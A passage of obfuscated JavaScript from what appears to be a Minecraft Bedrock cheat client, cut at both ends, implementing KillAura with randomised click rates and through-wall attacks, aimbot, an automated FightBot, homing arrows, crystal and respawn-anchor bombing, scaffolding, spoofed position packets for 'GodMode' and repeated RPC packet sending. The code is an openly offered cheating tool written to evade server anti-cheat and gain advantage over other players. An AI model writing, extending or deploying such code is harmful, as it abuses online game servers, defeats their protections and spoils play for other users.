            if (_0x420bdb.namespace == "minecraft:air") {
              moveItem(_0x36ad49, _0x4e144e, false);
              break _0x3f5873;
            }
          }
        }
      }
      if (ap_autobag && _0x3981f3) {
        closeInventory();
      }
    }
    if ((item_count != lasttick_item_count || !da_change) && SmartInv && (!da_bow || _0x412945.pitch > 80) && (!da_chest || isOpenChest)) {
      const _0x44dd7a = ["helmet", "chestplate", "leggings", "boots"];
      const _0x236b04 = [max_armor[0], max_armor[1], max_armor[2], max_armor[3]];
      let _0x4d7124 = 0;
      let _0x4f54ba = [0, 0, 0, 0];
      let _0x434685 = -1;
      let _0x1fccf9 = [-1, -1, -1, -1];
      for (let _0x139f94 = 35; _0x139f94 > -1; _0x139f94--) {
        const _0xd2e0a = getItemType(self_id, _0x139f94);
        if (_0xd2e0a === "other") {
          continue;
        }
        const _0x225060 = getItemCount(_0x139f94);
        const _0x45760e = _0x44dd7a.indexOf(_0xd2e0a);
        if (getItemDamage(self_id, _0x139f94) > 10) {
          continue;
        }
        if ((_0xd2e0a === "sword" || _0xd2e0a === "axe" || _0xd2e0a === "pickaxe") && getItemDamage(self_id, _0x139f94) > _0x4d7124) {
          _0x4d7124 = getItemDamage(self_id, _0x139f94);
          _0x434685 = _0x139f94;
        }
        if (_0x45760e !== -1 && getItemArmor(self_id, _0x139f94) > _0x4f54ba[_0x45760e]) {
          _0x4f54ba[_0x45760e] = getItemArmor(self_id, _0x139f94);
          _0x1fccf9[_0x45760e] = _0x139f94;
        }
        if ((_0xd2e0a === "sword" || _0xd2e0a === "axe" || _0xd2e0a === "pickaxe") && (getItemDamage(self_id, _0x139f94) < max_damage || _0x225060 > 1)) {
          dropPlayerInventorySlot(self_id, _0x139f94);
        }
        if (_0x45760e !== -1 && (getItemArmor(self_id, _0x139f94) < _0x236b04[_0x45760e] || _0x225060 > 1)) {
          dropPlayerInventorySlot(self_id, _0x139f94);
        }
      }
      if (da_move && _0x434685 != -1 && _0x1fccf9.every(_0x2cf71a => _0x2cf71a != -1)) {
        if (_0x434685 > -1) {
          moveItem(_0x434685, SmartInvCfg.sword);
        }
        for (let _0x2bf02b in _0x1fccf9) {
          let _0x1a4847 = _0x1fccf9[_0x2bf02b];
          if (_0x1a4847 > -1 && move_armor_slot < 0) {
            moveItem(_0x1a4847, SmartInvCfg[_0x44dd7a[_0x2bf02b]]);
          }
          if (_0x1a4847 > -1 && move_armor_slot >= 0) {
            moveItem(_0x1a4847, move_armor_slot, false);
          }
        }
      }
      if (da_chest) {
        isOpenChest = false;
      }
    }
    if (AutoArmor) {
      let _0x50f31b = getItemType(self_id, armor_slot);
      if (_0x50f31b != "other") {
        if (_0x50f31b == "helmet" && getItemArmor(self_id, armor_slot) > getItemArmor(self_id, -2)) {
          useArmor(armor_slot);
        }
        if (_0x50f31b == "chestplate" && getItemArmor(self_id, armor_slot) > getItemArmor(self_id, -3)) {
          useArmor(armor_slot);
        }
        if (_0x50f31b == "leggings" && getItemArmor(self_id, armor_slot) > getItemArmor(self_id, -4)) {
          useArmor(armor_slot);
        }
        if (_0x50f31b == "boots" && getItemArmor(self_id, armor_slot) > getItemArmor(self_id, -5)) {
          useArmor(armor_slot);
        }
      }
    }
    if (RemoveItem) {
      const _0x550481 = getEntityList();
      _0x550481.map(_0x378d16 => {
        if (getEntityTypeId(_0x378d16) == 64) {
          removeEntity(_0x378d16);
        }
      });
    }
    if (RemoveNotPlayer) {
      const _0x2e626f = getEntityList();
      _0x2e626f.map(_0x4556d8 => {
        if (!isPlayer(_0x4556d8)) {
          removeEntity(_0x4556d8);
        }
      });
    }
    if (_0x4f7660.count <= 0 && last_tick_item.count > 0 && last_tick_item.namespace != "minecraft:air" && AutoSelect) {
      for (let _0x8d5126 = 8; _0x8d5126 >= 0; _0x8d5126--) {
        let _0x4527d8 = getInventory(self_id, _0x8d5126);
        if (_0x4527d8.namespace == last_tick_item.namespace) {
          selectPlayerInventorySlot(self_id, _0x8d5126);
          break;
        }
      }
    }
    if (FreeCam && freecam_pos != {}) {
      if (freecam_show) {
        for (let _0x5ce4c9 = 0; _0x5ce4c9 <= 18; _0x5ce4c9 += 2) {
          drawParticle(55, freecam_pos.x, freecam_pos.y - 1.53 + _0x5ce4c9 / 10, freecam_pos.z, 1);
        }
        _0x2aa3e0.push("§rTip §7>>> " + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + "本体坐标: " + ("[X:" + freecam_pos.x.toFixed(2) + ", Y:" + freecam_pos.y.toFixed(2) + ", Z:" + freecam_pos.z.toFixed(2) + "]"));
      }
      if (freecam_dis) {
        _0x2aa3e0.push("§rTip §7>>> " + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + "本体距离:" + getDistance(self_pos, freecam_pos).toFixed(2) + "m");
      }
    }
    if (FakeMove && fakemove_pos != {}) {
      for (let _0x4b1ec6 = 0; _0x4b1ec6 <= 18; _0x4b1ec6 += 2) {
        drawParticle(55, fakemove_pos.x, fakemove_pos.y - 1.53 + _0x4b1ec6 / 10, fakemove_pos.z, 1);
      }
      _0x2aa3e0.push("§rTip §7>>> " + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + "本体坐标: " + ("[X:" + fakemove_pos.x.toFixed(2) + ", Y:" + fakemove_pos.y.toFixed(2) + ", Z:" + fakemove_pos.z.toFixed(2) + "]"));
      _0x2aa3e0.push("§rTip §7>>> " + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + "本体距离:" + getDistance(self_pos, fakemove_pos).toFixed(2) + "m");
    }
    if (RemovePlayer) {
      const _0x5d6d5c = getPlayerList();
      _0x5d6d5c.map(_0x387b86 => {
        if (_0x387b86 != self_id) {
          removeEntity(_0x387b86);
        }
      });
    }
    if (ArrowTracer) {
      const _0x5694c4 = getEntityList();
      _0x5694c4.map(_0x46b6fd => {
        if (getEntityTypeId(_0x46b6fd) == 12582992 && target_list.length > 0) {
          const _0x5ba4a4 = getEntityPos(target_list[0]);
          let _0x3776cf = getPlayerAngle(_0x5ba4a4, getEntityPos(_0x46b6fd), "yaw_pos");
          let _0x442a0d = getPlayerAngle(_0x5ba4a4, getEntityPos(_0x46b6fd), "pitch_pos");
          const _0x311569 = getEntityPos(_0x46b6fd);
          var _0xe32794 = {
            yaw: _0x3776cf,
            pitch: _0x442a0d
          };
          const _0x2476ea = getDisplacement(bow_speed, _0x311569, _0xe32794);
          setEntityMotion(_0x46b6fd, _0x2476ea.x - _0x311569.x, _0x2476ea.y - _0x311569.y, _0x2476ea.z - _0x311569.z);
        }
      });
      if (target_list.length > 0) {
        _0x2aa3e0.push("§rTip §7>>> " + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + "LockedTarget:" + getEntityName(target_list[0]));
      }
    }
    if (ArrowFly) {
      const _0x17c771 = getEntityList();
      _0x17c771.map(_0x2f3a15 => {
        if (getEntityTypeId(_0x2f3a15) == 12582992) {
          const _0x280066 = getEntityPos(_0x2f3a15);
          if (arrow_rot[_0x2f3a15] == undefined) {
            arrow_rot[_0x2f3a15] = _0x412945;
          }
          const _0xeac18b = arrow_rot[_0x2f3a15].yaw;
          const _0x4b7845 = arrow_rot[_0x2f3a15].pitch;
          var _0xb8503d = {
            yaw: _0xeac18b,
            pitch: _0x4b7845
          };
          const _0x565f01 = getDisplacement(1, _0x280066, _0xb8503d);
          setEntityMotion(_0x2f3a15, _0x565f01.x - _0x280066.x, _0x565f01.y - _0x280066.y, _0x565f01.z - _0x280066.z);
        }
      });
    }
    if (ArrowView) {
      const _0x392c74 = getEntityList();
      _0x392c74.forEach(_0x5c5a35 => {
        if (["minecraft:arrow", "minecraft:snowball", "minecraft:egg", "minecraft:ender_pearl"].includes(getEntityNamespace(_0x5c5a35)) && Arrow_id == null && !ArrowList.includes(Arrow_id)) {
          Arrow_id = _0x5c5a35;
        }
      });
      if (Arrow_id != null) {
        if (!ArrowList.includes(Arrow_id)) {
          ArrowList.push(Arrow_id);
        }
        let _0x1c8e87 = getEntityPos(Arrow_id);
        setCameraAnchor(_0x1c8e87.x - self_pos.x + (ArrowView_x - 10), _0x1c8e87.y - self_pos.y + (ArrowView_y - 10), -_0x1c8e87.z + self_pos.z + (ArrowView_z - 10));
      } else {
        setCameraAnchor(0, 0, 0);
      }
    }
    if (!findEntity(Arrow_id)) {
      Arrow_id = null;
    }
    if (FPSReducer) {
      for (let _0x31d314 = 0; _0x31d314 < fps_rate * 10; _0x31d314++) {
        for (let _0x55ad8d = 0; _0x55ad8d < fps_rate * 5; _0x55ad8d++) {
          log(_0x31d314 + _0x55ad8d);
        }
      }
    }
    if (ArrowParticle) {
      const _0x49e866 = getEntityList();
      _0x49e866.map(_0x53e6d1 => {
        if (getEntityNamespace(_0x53e6d1) == "minecraft:arrow") {
          const _0x15f615 = getEntityPos(_0x53e6d1);
          drawParticle(arrow_particle_type, _0x15f615.x, _0x15f615.y, _0x15f615.z, 3);
        }
      });
    }
    if (FightBot && target_list.length > 0) {
      let _0x50b1db = getEntityPos(target_list[0]);
      let _0x35cf97 = {};
      if (FightBot_autochest && getPlayerItemCount(self_id) == 0) {
        const _0x698114 = getPlayerBlockPos(self_id);
        _0x2b8f74: for (let _0x5e524 = -2; _0x5e524 < 3; _0x5e524++) {
          for (let _0x2096f5 = -2; _0x2096f5 < 3; _0x2096f5++) {
            for (let _0x1fc4dd = -2; _0x1fc4dd < 3; _0x1fc4dd++) {
              const _0x3bac24 = getBlock(_0x698114.x + _0x5e524, _0x698114.y + _0x2096f5, _0x698114.z + _0x1fc4dd);
              const _0x499e4a = obj2str([_0x698114.x + _0x5e524, _0x698114.y + _0x2096f5, _0x698114.z + _0x1fc4dd]);
              if (_0x3bac24.namespace == "minecraft:chest" && !chest_pos.includes(_0x499e4a)) {
                var _0x20834e = {
                  x: _0x698114.x + _0x5e524,
                  y: _0x698114.y + _0x2096f5,
                  z: _0x698114.z + _0x1fc4dd
                };
                _0x35cf97 = _0x20834e;
                if (getHorizontalDistance(self_pos, _0x35cf97) < FightBot_distance / 2) {
                  chest_pos.push(_0x499e4a);
                }
                break _0x2b8f74;
              }
            }
          }
        }
      }
      const _0x4ba175 = (_0x58cd3a ? -0.278 : -0.293) - FightBot_speed * Number(!FightBot_imitateMove) / 5;
      const _0x4d85ab = getRandomNum(0, 100) < FightBot_move_rate;
      if (FightBot_random_move && _0x4d85ab) {
        _0x50b1db = getDisplacement(_0x4ba175, _0x50b1db, {
          yaw: getRandomNum(0, 1) ? 90 : -90,
          pitch: 0
        });
      }
      let _0x35a44e = getPlayerAngle(self_id, _0x50b1db, "yaw_pos");
      var _0x549543 = {
        yaw: _0x35a44e,
        pitch: 0
      };
      let _0xe06e59 = getDisplacement(_0x4ba175, getEntityPos(self_id), _0x549543);
      if (_0x3ba0a3.current < FightBot_pot_health) {
        if (_0x4f7660.namespace !== "minecraft:splash_potion" || _0x4f7660.aux !== 22) {
          selectPlayerInventorySlot(self_id, getItem(self_id, "splash_potion", 22));
        } else {
          setLocalPlayerTurn(-90, 0);
          if (_0x4f7660.namespace.includes("splash_potion")) {
            setTimeout(() => useItem(), 75);
          }
        }
      }
      const _0x536e99 = getHorizontalDistanceByID(self_id, target_list[0]);
      if (JSON.stringify(_0x35cf97) == "{}") {
        if (_0x536e99 > FightBot_distance) {
          if (_0x58cd3a) {
            setEntityMotion(self_id, _0xe06e59.x - self_pos.x, (FightBot_jump || getRandomNum(0, 100) < FightBot_jump_rate && FightBot_random_jump) && _0x16a344.y > -0.0785 && _0x16a344.y < -0.0783 ? FightBot_height : _0x16a344.y, _0xe06e59.z - self_pos.z);
          }
          KillAura = false;
          KeepDistance = false;
          if (FightBot_Scaffold) {
            Scaffold = true;
          }
          if (Scaffold && keep_y) {
            rec_y = 0;
          }
          if (getRandomNum(0, 100) < FightBot_fishhook_rate && isAimed(self_id, target_list[0], 20, 0) && _0x536e99 < FightBot_distance * 3) {
            selectPlayerInventorySlot(self_id, getItem(self_id, "fishing_rod"));
            if (_0x4f7660.namespace.includes("fishing_rod")) {
              useItem();
            }
          }
        } else {
          if (getRandomNum(0, 100) < FightBot_snowball_rate && isAimed(self_id, target_list[0], 20, 0)) {
            selectPlayerInventorySlot(self_id, getItem(self_id, "snowball"));
            if (_0x4f7660.namespace.includes("snowball")) {
              useItem();
            }
          }
          if (_0x58cd3a) {
            setEntityMotion(self_id, FightBot_random_move && _0x4d85ab ? _0xe06e59.x - self_pos.x : _0x16a344.x, FightBot_combo && !getEntityIsGround(target_list[0]) ? FightBot_height : _0x16a344.y, FightBot_random_move && _0x4d85ab ? _0xe06e59.z - self_pos.z : _0x16a344.z);
          }
          if (FightBot_autoweapon) {
            selectPlayerInventorySlot(self_id, getItem(self_id, "sword"));
          }
          if (FightBot_KillAura) {
            KillAura = true;
          }
          if (FightBot_KeepDistance) {
            KeepDistance = true;
          }
          if (FightBot_aimbot) {
            AssistAim = true;
          }
          Scaffold = false;
        }
      } else {
        let _0x43fed4 = getPlayerAngle(self_id, _0x35cf97, "yaw_pos");
        var _0xd465df = {
          yaw: _0x43fed4,
          pitch: 0
        };
        let _0x560053 = getDisplacement(_0x4ba175, getEntityPos(self_id), _0xd465df);
        if (_0x16a344.y > -0.42 && _0x16a344.y < 0.42 && _0x58cd3a) {
          setEntityMotion(self_id, _0x560053.x - self_pos.x, (FightBot_jump || getRandomNum(0, 100) < FightBot_jump_rate && FightBot_random_jump) && _0x16a344.y > -0.0785 && _0x16a344.y < -0.0783 ? FightBot_height : _0x16a344.y, _0x560053.z - self_pos.z);
        }
      }
    }
    if (circulateSender && rpc_t > RepeatRpc_ticks) {
      for (let _0x49281c = 0; _0x49281c < RepeatRpc_times; _0x49281c++) {
        sendRpc(last_PyRpc.id, last_PyRpc.data);
      }
      rpc_t = 0;
    }
    if (RightClicker) {
      for (let _0x5d7bd9 = 0; _0x5d7bd9 < use_times; _0x5d7bd9++) {
        useItem();
      }
    }
    if (AutoShifter && shift_tick_r > shift_tick) {
      for (let _0x4dc323 = 0; _0x4dc323 < shift_num; _0x4dc323++) {
        setEntityFlag(self_id, 1, true);
      }
      shift_tick_r = 0;
    }
    if (AutoCrystal && target_list.length > 0) {
      if (SelectCrystal) {
        selectPlayerInventorySlot(self_id, getItem(self_id, "end_crystal"));
      }
      if (_0x4f7660.namespace == "minecraft:end_crystal" && t_c > crystal_delay) {
        let _0x3bb052 = 0;
        target_list.map(_0x294b84 => {
          if (getEntityTypeId(_0x294b84) != 71) {
            let _0x10de35 = getPlayerBlockPos(_0x294b84);
            if (CrystalTP) {
              setPos(_0x10de35.x, _0x10de35.y + 1, _0x10de35.z);
            }
            for (let _0x23774a = -2; _0x23774a < 3; _0x23774a++) {
              for (let _0x4116bf = -2; _0x4116bf < 3; _0x4116bf++) {
                for (let _0xe0a45f = -2; _0xe0a45f < 3; _0xe0a45f++) {
                  let _0x24b60d = getBlock(_0x10de35.x + _0x23774a, _0x10de35.y + _0xe0a45f, _0x10de35.z + _0x4116bf);
                  if ((_0x24b60d.namespace == "minecraft:bedrock" || _0x24b60d.namespace == "minecraft:obsidian") && _0x3bb052 < crystal_acount) {
                    buildBlock(self_id, _0x10de35.x + _0x23774a, _0x10de35.y + _0xe0a45f, _0x10de35.z + _0x4116bf, 1);
                    _0x3bb052 += 1;
                  }
                }
              }
            }
          }
        });
        t_c = 0;
      } else {
        _0x2aa3e0.push("§rTip §7>>> " + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + "请手持水晶");
      }
    }
    if (CrystalAura) {
      const _0x4346b3 = getEntityList();
      _0x4346b3.map(_0x3a847e => {
        if (getEntityTypeId(_0x3a847e) == 71 && getDistanceByID(_0x3a847e, target_list[0]) < CrystalAura_distance) {
          attack(_0x3a847e, AttackSwing);
        }
      });
    }
    if (AutoBomb && target_list.length > 0) {
      if (SelectBomb) {
        selectPlayerInventorySlot(self_id, getItem(self_id, "respawn_anchor"));
      }
      if (_0x4f7660.namespace == "minecraft:respawn_anchor" && t_b > bomb_delay) {
        target_list.map(_0x44da31 => {
          let _0x56e755 = getPlayerBlockPos(_0x44da31);
          let _0x36697e = getBlock(_0x56e755.x, _0x56e755.y + 2, _0x56e755.z);
          if (_0x36697e.namespace == "minecraft:air") {
            buildBlock(self_id, _0x56e755.x, _0x56e755.y + 2, _0x56e755.z, 0);
          }
          _0x36697e = getBlock(_0x56e755.x, _0x56e755.y + 2, _0x56e755.z);
          if (_0x36697e.namespace == "minecraft:respawn_anchor") {
            buildBlock(self_id, _0x56e755.x, _0x56e755.y + 2, _0x56e755.z, 0);
          }
        });
        t_b = 0;
      } else {
        _0x2aa3e0.push("§rTip §7>>> " + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + "请手持重生锚");
      }
    }
    if (CPvP && target_list.length > 0) {
      target_list.map(_0x311e1c => {
        const _0x3d147d = getPlayerBlockPos(_0x311e1c);
        let _0xdf7e84 = [[_0x3d147d.x, _0x3d147d.y + 2, _0x3d147d.z], [_0x3d147d.x + 1, _0x3d147d.y, _0x3d147d.z], [_0x3d147d.x - 1, _0x3d147d.y, _0x3d147d.z], [_0x3d147d.x, _0x3d147d.y, _0x3d147d.z + 1], [_0x3d147d.x, _0x3d147d.y, _0x3d147d.z - 1], [_0x3d147d.x + 1, _0x3d147d.y + 1, _0x3d147d.z], [_0x3d147d.x - 1, _0x3d147d.y + 1, _0x3d147d.z], [_0x3d147d.x, _0x3d147d.y + 1, _0x3d147d.z + 1], [_0x3d147d.x, _0x3d147d.y + 1, _0x3d147d.z - 1]];
        for (_0x39238f of _0xdf7e84) {
          let _0x1f2411 = getBlock(_0x39238f[0], _0x39238f[1], _0x39238f[2]);
          if (_0x1f2411.namespace == "minecraft:air" && func_mode.cpvp_mode == 1) {
            buildBlock(self_id, _0x39238f[0], _0x39238f[1], _0x39238f[2], 1);
          }
          if (_0x1f2411.namespace != "minecraft:air" && func_mode.cpvp_mode == 0) {
            destroyBlock(self_id, _0x39238f[0], _0x39238f[1], _0x39238f[2], 1);
          }
        }
      });
    }
    if (KillAura && target_list.length > 0) {
      var _0x36e99f = [];
      var _0x4076d6 = getEntityPos(self_id);
      var _0x447a2b = false;
      _0x4076d6.y += 1.53;
      if (KillAura_cps_delay == 0) {
        random_num = getRandomNum(KillAura_min_cps, KillAura_max_cps) / (KillAura_Balance ? target_list.length : 1);
        random_delay = Math.round(1000 / random_num);
      }
      target_list.map(_0x3cd26d => {
        var _0x328835 = getEntityPos(_0x3cd26d);
        _0x328835.y += 0.9;
        if ((getDistanceByID(self_id, _0x3cd26d) <= KillAura_distance || KillAura_infinite) && isAimed(self_id, _0x3cd26d, KillAura_Fov, 0) && checkWall(_0x4076d6, _0x328835, !through_wall) && (!KillAura_crit || _0x16a344.y < -0.0784)) {
          _0x447a2b = true;
          KillAura_d_1[_0x3cd26d] = Date.now();
          if (KillAura_d_2[_0x3cd26d] == undefined || KillAura_d_1[_0x3cd26d] - KillAura_d_2[_0x3cd26d] > 0) {
            for (k = 0; k < KillAura_boost; k++) {
              attack(_0x3cd26d, AttackSwing);
            }
            _0x36e99f.push(_0x3cd26d);
            KillAura_d_2[_0x3cd26d] = KillAura_d_1[_0x3cd26d] + (KillAura_cps_delay == 0 ? random_delay : KillAura_cps_delay * 50);
          }
        } else {
          if (KillAura_d_1[_0x3cd26d] != undefined) {
            KillAura_d_1.splice(KillAura_d_1.indexOf(_0x3cd26d), 1);
          }
          if (KillAura_d_2[_0x3cd26d] != undefined) {
            KillAura_d_2.splice(KillAura_d_2.indexOf(_0x3cd26d), 1);
          }
        }
      });
      if (KillAura_person && _0x447a2b) {
        setPlayerViewPerspective(1);
      }
      if (KillAura_person && !_0x447a2b) {
        setPlayerViewPerspective(0);
      }
      if (FuncTip && _0x36e99f.length > 0 && !ShortList) {
        _0x2aa3e0.push("§rAttack §7>>> " + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + obj2str(_0x36e99f.map(_0xba4f1e => getEntityName(_0xba4f1e))));
      }
      if (FuncTip && _0x36e99f.length > 0 && ShortList) {
        _0x2aa3e0.push("§rAttacks §7>>> " + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + _0x36e99f.length + "个目标");
      }
      const _0x310688 = _0x36e99f.length * random_num * KillAura_boost;
      if (show_cps && FuncTip && _0x310688 > 0) {
        _0x2aa3e0.push("§rCPS §7>>> " + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + _0x310688 + "/s");
      }
    }
    if (AvoidAttack) {
      setPos(100000, 100000, 100000);
    }
    if (SlowDown && _0x16a344.y < -slowdown_speed / 30) {
      setMotion(_0x16a344.x, -slowdown_speed / 30, _0x16a344.z);
    }
    if (SurroundParticle && (getEntityFlag(self_id, 34) || !only_walk)) {
      surround_particle_yaw = surround_particle_yaw + particle_surround_speed * 3;
      if (surround_particle_yaw > 180) {
        surround_particle_yaw = -180;
      }
      var _0x22c370 = {
        yaw: surround_particle_yaw,
        pitch: 0
      };
      var _0x62ec82 = getDisplacement(surround_particle_length, self_pos, _0x22c370);
      drawParticle(surround_particle_type, _0x62ec82.x, _0x62ec82.y - 1.8 + surround_particle_heigh, _0x62ec82.z, surround_particle_size);
    }
    if (tp_list.length > 0) {
      const _0x802789 = tp_list.shift();
      buildBlock(self_id, _0x802789[0], _0x802789[1], _0x802789[2], 0);
      setPos(_0x802789[0], _0x802789[1], _0x802789[2]);
      destroyBlock(self_id, _0x802789[0], _0x802789[1], _0x802789[2], 1);
      if (tp_list.length === 1) {
        callModule(35, "{\"value\":false,\"count\":18}");
      }
    }
    if (motion_list.length > 0) {
      const _0x1879ea = motion_list.shift();
      setMotion(_0x1879ea[0], _0x1879ea[1], _0x1879ea[2]);
    }
    const _0x50a573 = getBlock(_0x423186.x, rec_y - 1, _0x423186.z);
    const _0x15fabc = getInventory(self_id, Scaffold_BlockSlot);
    if (!Scaffold_HasSelected && getPlayerSelectItemSlot(self_id) == Scaffold_BlockSlot) {
      Scaffold_HasSelected = true;
    }
    if (Scaffold_HasSelected && _0x15fabc.count <= 0) {
      Scaffold_HasSelected = false;
      Scaffold_BlockSlot = -1;
      Scaffold_CurrentSlot = -1;
      Scaffold_HasReceived = false;
    }
    if (Scaffold_auto_block && Scaffold && !_0x4f7660.isBlock && !Scaffold_HasSelected && !isAttacking && _0x50a573.namespace == "minecraft:air") {
      for (let _0x531d87 = 0; _0x531d87 < 9; _0x531d87++) {
        const _0x5f5d32 = getInventory(self_id, _0x531d87);
        if (_0x5f5d32.isBlock) {
          if (Scaffold_any) {
            Scaffold_CurrentSlot = getPlayerSelectItemSlot(self_id);
          }
          selectPlayerInventorySlot(self_id, _0x531d87);
          if (Scaffold_any) {
            Scaffold_BlockSlot = _0x531d87;
          }
          break;
        }
      }
    }
    if (Scaffold && (_0x4f7660.isBlock && _0x4f7660.namespace != "minecraft:air" || Scaffold_HasSelected && Scaffold_HasReceived)) {
      if (FuncTip && getItemCount(Scaffold_HasSelected ? Scaffold_BlockSlot : -1) < 4) {
        _0x2aa3e0.push("§cWarning §7>>> " + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + "手持方块不足!");
      }
      const _0x3130d8 = predictEntityPos(getEntityMotion(self_id), getEntityPos(self_id), 5);
      const _0x3517fe = Scaffold_move ? getPlayerAngle(_0x3130d8, self_id, "yaw_pos") : _0x412945.yaw;
      const _0x3d6cfb = Scaffold_move ? getPlayerAngle(_0x3130d8, self_id, "pitch_pos") : _0x412945.pitch;
      let _0x31e031 = false;
      let _0xb3cb39 = {};
      if (Scaffold_mode && Scaffold_findPath) {
        let _0x311482 = Infinity;
        for (let _0x1ccaa6 = -3; _0x1ccaa6 <= 3; _0x1ccaa6++) {
          for (let _0x192f64 = -3; _0x192f64 <= 1; _0x192f64++) {
            for (let _0x520ad0 = -3; _0x520ad0 <= 3; _0x520ad0++) {
              let _0x1baabe = Math.sqrt(_0x1ccaa6 * _0x1ccaa6 + _0x520ad0 * _0x520ad0 + _0x192f64 * _0x192f64);
              var _0x5d734a = {
                x: _0x1ccaa6 + _0x423186.x
              };
              _0x5d734a.y = Math.floor(rec_y) - 1 + _0x192f64;
              _0x5d734a.z = _0x520ad0 + _0x423186.z;
              let _0x3fdad1 = _0x5d734a;
              const _0x1cc719 = getBlock(_0x3fdad1.x, _0x3fdad1.y, _0x3fdad1.z);
              if (_0x1baabe < _0x311482 && _0x1cc719.namespace != "minecraft:air") {
                _0x311482 = _0x1baabe;
                _0xb3cb39 = _0x3fdad1;
              }
            }
          }
        }
      }
      if (Scaffold_bjd && _0x50a573.namespace == "minecraft:air") {
        attackEntity(self_id, true);
      }
      for (let _0x11f022 = 0; _0x11f022 < Scaffold_length; _0x11f022++) {
        var _0x3d3c62 = {};
        _0x3d3c62.yaw = Math.round(_0x3517fe);
        _0x3d3c62.pitch = Scaffold_pitch ? _0x3d6cfb : 0;
        const _0x2ff5e8 = getDisplacement(_0x11f022, self_pos, _0x3d3c62);
        rec_y = !keep_y || rec_y === 0 ? Math.floor(_0x2ff5e8.y) - 1 : rec_y;
        const _0x302f5f = getBlock(Math.floor(_0x2ff5e8.x), Math.floor(rec_y - Scaffold_height + 5) - 1, Math.floor(_0x2ff5e8.z));
        const _0x1a859b = getBlock(Math.floor(_0x2ff5e8.x), Math.floor(rec_y - Scaffold_height + 5) + 2, Math.floor(_0x2ff5e8.z));
        if (!["minecraft:air", "minecraft:water", "minecraft:lava"].includes(_0x302f5f.namespace)) {
          continue;
        }
        _0x31e031 = true;
        var _0x5544ac = {};
        _0x5544ac.x = Math.floor(_0x2ff5e8.x);
        _0x5544ac.y = Math.floor(rec_y) - 1;
        _0x5544ac.z = Math.floor(_0x2ff5e8.z);
        const _0x9db6a6 = _0x5544ac;
        if (Scaffold_other || Scaffold_self) {
          Scaffold_aim_pos = getDisplacement(4, _0x9db6a6, {
            yaw: 180,
            pitch: 0
          });
        }
        if (Scaffold_hyt) {
          setBlock(self_id, Math.floor(_0x2ff5e8.x), Math.floor(rec_y - Scaffold_height + 5) - 1, Math.floor(_0x2ff5e8.z), _0x4f7660.namespace, _0x4f7660.aux);
        }
        if (!Scaffold_mode) {
          buildBlock(self_id, Math.floor(_0x2ff5e8.x), Math.floor(rec_y - Scaffold_height + 5) - 1, Math.floor(_0x2ff5e8.z), 1);
        } else if (Scaffold_findPath && _0xb3cb39 != {}) {
          let _0x3b833b = findPath(_0xb3cb39, _0x9db6a6);
          _0x3b833b.map(_0x239f56 => {
            const _0x500103 = getBlock(Math.round(_0x239f56.x), Math.round(_0x239f56.y - Scaffold_height + 5), Math.round(_0x239f56.z));
            if (_0x500103.namespace === "minecraft:air") {
              Click(Math.round(_0x239f56.x), Math.round(_0x239f56.y - Scaffold_height + 5), Math.round(_0x239f56.z));
            }
          });
        } else {
          Click(Math.floor(_0x2ff5e8.x), Math.floor(rec_y - Scaffold_height + 5) - 1, Math.floor(_0x2ff5e8.z));
        }
        if (Scaffold_up) {
          buildBlock(self_id, Math.floor(_0x2ff5e8.x), Math.floor(rec_y - Scaffold_height + 5) + 2, Math.floor(_0x2ff5e8.z), 0);
        }
      }
      if (Scaffold_person && _0x31e031) {
        setPlayerViewPerspective(1);
      }
      if (Scaffold_person && !_0x31e031) {
        setPlayerViewPerspective(0);
      }
    }
    if (Scaffold_HasSelected && Scaffold_HasReceived && getPlayerSelectItemSlot(self_id) == Scaffold_BlockSlot) {
      selectPlayerInventorySlot(self_id, Scaffold_CurrentSlot);
    }
    if (AttackSelf) {
      attack(self_id, AttackSwing);
    }
    if (AntiVoid) {
      if (!lagback_run && !_0x58cd3a && _0x16a344.y > -lagback_y) {
        lagback_pos.push(self_pos);
      }
      if (!lagback_run && _0x58cd3a) {
        lagback_pos = [];
      }
      if (!lagback_run && _0x16a344.y <= -lagback_y) {
        lagback_run = true;
      }
      if (lagback_run) {
        if (lagback_pos.length > 0) {
          var _0x2625f5 = lagback_pos.pop();
          setPos(_0x2625f5.x, _0x2625f5.y, _0x2625f5.z);
          if (lagback_derp) {
            setLocalPlayerTurn(0, 120);
          }
        } else {
          lagback_run = false;
        }
      }
    }
    if (GodMode && (!gm_move || getEntityFlag(self_id, 34)) && (gm_ground || _0x58cd3a)) {
      if (gm_tick == gm_cycle) {
        gm_pos = getEntityPos(self_id);
        gm_mot = getEntityMotion(self_id);
        for (let _0x4c5821 = 0; _0x4c5821 < gm_count; _0x4c5821++) {
          if (func_mode.GodMode_mode == 0) {
            Teleport(self_pos.x, gm_y > 0 ? gm_y ^ 10 : 100, self_pos.z);
          }
          if (func_mode.GodMode_mode == 1) {
            setPos(self_pos.x, gm_y > 0 ? gm_y ^ 10 : 100, self_pos.z);
          }
          if (func_mode.GodMode_mode == 2) {
            sendPlayerAuthInput({
              pos: {
                x: gm_xz ? 10000 : self_pos.x,
                y: gm_edit_y ? gm_y > 0 ? gm_y ^ 10 : 100 : self_pos.y,
                z: gm_xz ? 10000 : self_pos.z
              },
              inputMode: 2,
              playMode: 0,
              motion: {
                x: 0,
                y: 0,
                z: 0
              },
              rot: _0x412945,
              yHeadRot: 0
            });
          }
        }
        if (!tp_back) {
          gm_tick = 0;
        }
      }
      if (tp_back && gm_tick >= gm_cycle + gm_delay) {
        for (let _0x2b29f8 = 0; _0x2b29f8 < gm_count; _0x2b29f8++) {
          if (func_mode.GodMode_mode < 2) {
            setPos(gm_pos.x, gm_pos.y, gm_pos.z);
          }
          if (func_mode.GodMode_mode < 2) {
            setMotion(gm_mot.x, gm_mot.y, gm_mot.z);
          }
          if (func_mode.GodMode_mode == 2) {
            var _0x129a90 = {
              x: gm_xz ? 10000 : self_pos.x,
              y: gm_y > 0 ? gm_y ^ 10 : 100,
              z: gm_xz ? 10000 : self_pos.z
            };
            var _0x11dd1a = {
              inputMode: 2,
              playMode: 0,
